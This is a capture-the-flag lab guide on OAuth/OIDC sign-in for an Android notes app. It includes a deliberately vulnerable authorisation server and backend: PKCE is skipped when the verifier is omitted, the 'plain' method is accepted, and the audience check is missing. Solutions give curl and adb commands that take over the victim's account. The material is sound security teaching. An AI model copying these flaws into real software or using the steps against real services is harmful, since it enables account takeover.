# Lab 04 — CTF: The Borrowed Identity

**Difficulty:** Advanced
**Time:** 3–5 hours
**Prerequisites:** [Lab 01](lab-01-intercept-the-flow.md), [Lab 02](lab-02-pkce-enforcement.md),
[Lab 03](lab-03-scheme-hijack.md), [Chapter 45 §3.12, §5.1](../README.md)

---

## The challenge

You are handed an APK — **VaultNotes**, a note-taking app with "Sign in with LabID" — and the
hostname of the identity provider it uses. You have one ordinary account:
`researcher@lab.local` / `researcher`.

There is a second account, `victim@lab.local`, whose private note contains the flag. You do not have
its password and you never will.

**Read the victim's private note.**

The app looks correct. It uses AppAuth, it opens a Custom Tab, it sends
`code_challenge_method=S256`, it sends and validates `state`, and there is no client secret anywhere
in the APK. A static scan comes back clean. A tool will tell you this app is fine.

There are **three independent paths** to the flag. Find one, then find a second. The point of this
lab is that the client can be flawless while the system is not, and that a finding lives at whichever
layer you bothered to test.

---

## Rules

- No brute-forcing the victim's password.
- No reading the flag out of the mock server's database or filesystem.
- No modifying the mock server's configuration to make the attack work.
- You must be able to name, for each path you use, **which control failed and at which layer** — the
  client, the front channel, the authorisation server, or the app's own backend.

---

## Building the challenge

Build it yourself. Implementing the flaws is most of the education, and you cannot report on a
mechanism you have not constructed.

### Part 1 — The mock authorisation server

A small Flask application serving the OIDC endpoints. Three flaws are planted in it; each is a real
pattern seen in production.

```python
#!/usr/bin/env python3
# labs/ctf/mock_as.py — deliberately vulnerable OIDC authorisation server.
# Usage: pip install flask pyjwt cryptography && python3 mock_as.py
# Listens on 0.0.0.0:9000. NEVER expose this outside a lab network.

import base64, hashlib, json, os, secrets, time
from flask import Flask, request, redirect, jsonify
import jwt   # PyJWT

app = Flask(__name__)
ISSUER = os.environ.get("ISSUER", "http://10.0.2.2:9000")

# --- key material -----------------------------------------------------------
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
KEY = rsa.generate_private_key(public_exponent=65537, key_size=2048)
PRIV = KEY.private_bytes(serialization.Encoding.PEM,
                         serialization.PrivateFormat.PKCS8,
                         serialization.NoEncryption())

USERS = {"researcher@lab.local": "researcher", "victim@lab.local": secrets.token_hex(16)}

# Two registered clients. The second one is the whole point of FLAW 3.
CLIENTS = {
    "vaultnotes-android": {"redirect_uris": ["vaultnotes://oauth/callback"]},
    "photofilters-android": {"redirect_uris": ["photofilters://cb"]},   # anyone can register
}

CODES = {}       # code -> {sub, challenge, method, client_id, redirect_uri, nonce, used}

@app.route("/.well-known/openid-configuration")
def discovery():
    return jsonify({
        "issuer": ISSUER,
        "authorization_endpoint": f"{ISSUER}/authorize",
        "token_endpoint": f"{ISSUER}/token",
        "jwks_uri": f"{ISSUER}/jwks",
        "response_types_supported": ["code"],
        "grant_types_supported": ["authorization_code", "refresh_token"],
        # FLAW 1 (visible here if you look): `plain` is advertised.
        "code_challenge_methods_supported": ["S256", "plain"],
        "id_token_signing_alg_values_supported": ["RS256"],
        "scopes_supported": ["openid", "profile", "email", "notes.read", "notes.write"],
    })

@app.route("/jwks")
def jwks():
    from jwt.algorithms import RSAAlgorithm
    pub = KEY.public_key().public_bytes(
        serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
    return jsonify({"keys": [json.loads(RSAAlgorithm.to_jwk(KEY.public_key())) | {"kid": "lab1"}]})

@app.route("/authorize", methods=["GET", "POST"])
def authorize():
    if request.method == "GET":
        q = request.args
        return f"""<html><body><h2>LabID sign-in</h2>
        <p style="color:#666">client: {q.get('client_id')}</p>
        <form method="post">
          {''.join(f'<input type=hidden name={k} value="{v}">' for k, v in q.items())}
          <input name=u placeholder=email><input name=p type=password placeholder=password>
          <button>Sign in</button>
        </form></body></html>"""

    f = request.form
    if USERS.get(f.get("u")) != f.get("p"):
        return "bad credentials", 401

    code = secrets.token_urlsafe(24)
    CODES[code] = {
        "sub": f.get("u"),
        "challenge": f.get("code_challenge"),
        "method": f.get("code_challenge_method", "plain"),
        "client_id": f.get("client_id"),
        "redirect_uri": f.get("redirect_uri"),
        "nonce": f.get("nonce"),
        "used": False,
        "ts": time.time(),
    }
    sep = "&" if "?" in f.get("redirect_uri", "") else "?"
    return redirect(f"{f['redirect_uri']}{sep}code={code}&state={f.get('state','')}")

@app.route("/token", methods=["POST"])
def token():
    code = request.form.get("code")
    rec = CODES.get(code)
    if not rec:
        return jsonify({"error": "invalid_grant"}), 400

    # FLAW 2: the verifier is checked ONLY IF the client bothers to send one.
    # Omit code_verifier entirely and this whole block is skipped.
    verifier = request.form.get("code_verifier")
    if verifier is not None:
        if rec["method"] == "S256":
            calc = base64.urlsafe_b64encode(
                hashlib.sha256(verifier.encode("ascii")).digest()).rstrip(b"=").decode()
        else:
            calc = verifier                      # FLAW 1: `plain` accepted
        if calc != rec["challenge"]:
            return jsonify({"error": "invalid_grant"}), 400

    rec["used"] = True
    now = int(time.time())
    claims = {
        "iss": ISSUER, "sub": rec["sub"], "email": rec["sub"],
        "aud": rec["client_id"],          # correct here — the flaw is downstream
        "iat": now, "exp": now + 3600, "nonce": rec.get("nonce"),
    }
    id_token = jwt.encode(claims, PRIV, algorithm="RS256", headers={"kid": "lab1"})
    return jsonify({
        "access_token": secrets.token_urlsafe(32),
        "token_type": "Bearer",
        "expires_in": 3600,
        "id_token": id_token,
        "scope": "openid profile notes.read notes.write",
    })

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=9000)
```

### Part 2 — The VaultNotes backend

This is where the third flaw lives, and it is the one that most closely mirrors production reality.

```python
#!/usr/bin/env python3
# labs/ctf/vault_backend.py — the app's own API. Trusts the id_token it is given.
# Usage: pip install flask pyjwt cryptography requests && python3 vault_backend.py
# Listens on 0.0.0.0:9100.

import json, os, requests
from flask import Flask, request, jsonify
import jwt
from jwt import PyJWKClient

app = Flask(__name__)
ISSUER = os.environ.get("ISSUER", "http://10.0.2.2:9000")
MY_CLIENT_ID = "vaultnotes-android"

NOTES = {
    "researcher@lab.local": ["shopping list: milk, bread"],
    "victim@lab.local": ["LAB{aud_is_not_optional_and_neither_is_pkce}"],
}

@app.route("/api/v1/social-login", methods=["POST"])
def social_login():
    tok = request.json.get("id_token", "")
    jwks = PyJWKClient(f"{ISSUER}/jwks")
    key = jwks.get_signing_key_from_jwt(tok).key

    # The signature IS verified. iss IS checked. exp IS checked.
    # FLAW 3: `aud` is never checked. options={"verify_aud": False} is the entire bug.
    claims = jwt.decode(tok, key, algorithms=["RS256"], issuer=ISSUER,
                        options={"verify_aud": False})

    # And it keys the account on `email` rather than `sub`.
    return jsonify({"session": claims["email"], "notes": NOTES.get(claims["email"], [])})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=9100)
```

### Part 3 — The VaultNotes app

Build a minimal AppAuth-based Android client (start from
[`../examples/02-appauth/AppAuthLogin.kt`](../examples/02-appauth/AppAuthLogin.kt)) with:

- `client_id = "vaultnotes-android"`
- redirect `vaultnotes://oauth/callback` declared as a **custom scheme** in the manifest
- correct `S256` PKCE, correct `state`, a Custom Tab, and no client secret
- after the token exchange, it POSTs the `id_token` to `http://10.0.2.2:9100/api/v1/social-login`
  and renders the returned notes

The client is deliberately *correct*. That is the trap.

```bash
# host — run the lab infrastructure
python3 mock_as.py &
python3 vault_backend.py &
adb reverse tcp:9000 tcp:9000   # or use 10.0.2.2 on an emulator
adb reverse tcp:9100 tcp:9100
```

---

## Your first attempt (which will fail)

```bash
# host
jadx -d out/ vaultnotes.apk
grep -rn 'client_secret\|password\|LAB{' out/sources/  || echo "nothing"
grep -rn 'code_challenge' out/sources/ | head
apktool d vaultnotes.apk -o work/ && grep -n 'scheme' work/AndroidManifest.xml
```

**Q1.** Did static analysis find anything actionable? What did it tell you about the *client*?

**Q2.** The app sends `code_challenge_method=S256`. Write down what that proves. Then write down what
it does not prove. Keep both sentences — the debrief asks for them.

---

## Investigation

Work these before opening the solutions.

### Interrogate the server, not the app

```bash
# host
curl -s http://localhost:9000/.well-known/openid-configuration | jq
```

**Q3.** Is anything in that document a red flag? Compare it against the table in
[§7.8](../README.md#78-testing-the-discovery-document-and-server-posture).

### Test enforcement rather than presence

Capture a code and verifier as in Lab 01, then run Lab 02's variants.

**Q4.** What does variant B (verifier omitted) return? What does variant C (verifier wrong) return?
Do they differ, and what does the difference tell you about the server's implementation?

### Look at what the app sends its own backend

```bash
# host
frida -U -f com.lab.vaultnotes -l ../scripts/oauth-flow-tracer.js
```

**Q5.** What does the app POST to `/api/v1/social-login`? Decode the JWT it sends. What is `aud`?

**Q6.** What would happen if you sent a *different* valid token to that endpoint? What single claim
should prevent it?

### Enumerate the registered clients

```bash
# host — is your client_id the only one this AS knows about?
curl -s "http://localhost:9000/authorize?client_id=photofilters-android&redirect_uri=photofilters://cb&response_type=code&scope=openid" -i | head -20
```

**Q7.** What does the existence of a second registered client enable?

---

## Solutions

Do not read these until you have made a genuine attempt at all three.

<details>
<summary>Path A — PKCE is not enforced when the verifier is omitted</summary>

Read `FLAW 2` in `mock_as.py`: the verifier check is inside `if verifier is not None`. A client that
sends a *wrong* verifier is rejected; a client that sends *no* verifier sails straight through. This
is the most common real-world shape of this bug, because the code was written as "validate the
verifier if we got one" rather than "require a verifier".

Chain it with Lab 03's hijacker:

1. Install a hijacker registering `vaultnotes://`.
2. Have the victim sign in (in the lab, sign in as `victim@lab.local` using the credentials the mock
   server printed at startup — or better, have a lab partner do it so you genuinely never see them).
3. Intercept the code.
4. Redeem it **with no verifier**:

```bash
# host
curl -s -X POST http://localhost:9000/token \
  -d grant_type=authorization_code -d code="$STOLEN" \
  -d redirect_uri="vaultnotes://oauth/callback" -d client_id="vaultnotes-android" | jq .
```

You now hold an `id_token` for `victim@lab.local`. POST it to the backend and read the note.

**Layer that failed:** the authorisation server's token endpoint. **Control that failed:** PKCE
enforcement. Note that the *client* did everything right.
</details>

<details>
<summary>Path B — PKCE downgrade to `plain`</summary>

The discovery document advertises `plain` in `code_challenge_methods_supported`, and `mock_as.py`
honours whatever `code_challenge_method` arrives.

You do not need to steal anything from the app. Drive the flow yourself with a challenge you choose:

```bash
# host
X="attacker_chosen_verifier_of_at_least_43_characters_long"
# open in the device browser (or curl the form directly)
adb shell am start -a android.intent.action.VIEW -d \
"http://10.0.2.2:9000/authorize?response_type=code&client_id=vaultnotes-android\
&redirect_uri=vaultnotes%3A%2F%2Foauth%2Fcallback&scope=openid&state=x\
&code_challenge=$X&code_challenge_method=plain"
```

Because the challenge *is* the verifier under `plain`, an attacker who can rewrite the front channel
— exactly the attacker PKCE exists to stop — supplies both halves. Combined with a hijacked redirect,
this defeats PKCE even if the omission bug in Path A were fixed.

**Layer that failed:** the authorisation server's policy. **Control that failed:** refusing weak
challenge methods. The discovery document told you in advance, which is why fetching it is the
cheapest step in any engagement.
</details>

<details>
<summary>Path C — audience confusion at the app's own backend</summary>

This is the most instructive path, because it needs no interception at all and works against a
perfectly hardened OAuth flow.

`vault_backend.py` verifies the signature, the issuer and the expiry — and passes
`options={"verify_aud": False}`. So it accepts **any** token this issuer signed, regardless of which
client it was minted for.

The mock AS has a second registered client, `photofilters-android`. Anyone can register a client with
an identity provider; that is what public client registration means.

1. Run an authorisation flow as `client_id=photofilters-android`, redirect `photofilters://cb`,
   signing in as the victim. In a real engagement this is the step where the victim signs into your
   innocuous-looking app — a game, a wallpaper app — of their own free will.
2. You receive a **genuinely signed** `id_token` with `aud: "photofilters-android"` and
   `sub/email: victim@lab.local`.
3. POST it to VaultNotes' backend:

```bash
# host
curl -s -X POST http://localhost:9100/api/v1/social-login \
  -H 'Content-Type: application/json' \
  -d "{\"id_token\":\"$TOKEN_FROM_MY_OWN_CLIENT\"}" | jq .
```

Every signature check passes. The flag comes back.

**Layer that failed:** the application's own backend. **Control that failed:** the `aud` check. This
is the classic "Sign in with X" flaw, it is entirely independent of everything the mobile app does,
and no amount of client-side hardening prevents it.

A secondary flaw compounds it: the backend keys the session on `email` rather than `sub`, so an
identity provider that does not verify email addresses would offer an even easier path.
</details>

---

## Debrief questions

Answer in writing. These are the actual point of the lab.

1. The app was correct. List every client-side control it implemented properly, and then state, for
   each one, **where the corresponding enforcement had to happen** for it to be meaningful.
2. Path A and Path C both give account takeover. Rank them by (a) how easy they are to find,
   (b) how easy they are to exploit at scale, (c) how likely an automated scanner is to catch them.
3. Explain FLAW 2 to the developer who wrote it. They will say "but we *do* validate the verifier".
   What is the one-sentence correction?
4. Path C required no interception and no malicious app on the device. What does that imply about
   threat models that focus exclusively on device-side attackers?
5. Write the three findings — one per path — with severity, impact and remediation. Which one would
   you lead the report with, and why?
6. Both `mock_as.py` and `vault_backend.py` would pass a code review by someone who "knows OAuth".
   For each flaw, write the one review question that would have caught it.
7. You are asked to write automated regression tests so these three flaws can never return. Write the
   assertion for each, and identify which of the three is hardest to automate and why.
8. The `id_token` contains `aud`, and the backend has the value it expects. Explain, in terms of trust
   boundaries, why omitting one string comparison converts a correctly-signed token into a universal
   skeleton key.

---

## Success criteria

- [ ] You recovered the flag
- [ ] You recovered it a **second** way, via a different layer
- [ ] For each path, you can name the layer and the control that failed
- [ ] You explained why static analysis of the APK could never have found any of these
- [ ] You explained why `code_challenge_method=S256` in the request was not evidence of anything
- [ ] You wrote all three findings with severity, impact and remediation as configuration or code
- [ ] You answered all eight debrief questions in writing

---

## Note for instructors

The pedagogical goal is not the flag. It is the moment a participant realises that the app they spent
two hours decompiling was **never where the bug was**, and that the two hours were spent because
decompiling feels like progress.

Run it in this order if teaching a group: let everyone decompile first and find nothing, then release
the discovery document, then release the backend source. The gap between "the app is clean" and "the
system is broken in three places" is the lesson, and it lands harder if participants experience the
dead end before being rescued from it.

Participants who reach for Frida immediately should be asked to also solve Path C, which needs no
instrumentation at all. Participants who solve Path C from source should be made to solve Path A on a
device. The comparison is where the learning is.
